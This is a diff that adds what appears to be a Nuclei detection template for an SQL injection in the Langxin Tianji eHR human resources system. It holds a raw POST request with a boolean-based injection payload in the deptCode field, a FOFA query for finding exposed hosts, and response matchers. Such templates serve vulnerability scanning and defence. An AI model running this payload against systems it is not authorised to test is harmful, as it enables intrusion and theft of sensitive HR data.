@@ -1,0 +1,33 @@
+id: langxin-hr-GetE01ByDeptCode-sqli
+info:
+  name: 朗新天霁智能人力资源管理系统 GetE01ByDeptCode - sqli
+  author: leadlife
+  severity: high
+  description: 朗新天霁智能eHR人力资源管理系统GetE01ByDeptCode存在SQL注入漏洞，攻击者可获取数据库敏感数据。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%9C%97%E6%96%B0%E5%A4%A9%E9%9C%81%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%9C%97%E6%96%B0%E5%A4%A9%E9%9C%81%E6%99%BA%E8%83%BDeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetE01ByDeptCode%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="divRememberPwd"
+  tags: langxin,ehr,hrsoft,sqli
+
+
+http:
+  - raw:
+      - |
+        POST /api/Com/GetE01ByDeptCode HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/json
+        Connection: close
+        
+        {"deptCode":"1') AND 8104=8104 AND ('UCOF'='UCOF"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Dept_ID','Dept_Code','Dept_Content')
+        condition: and
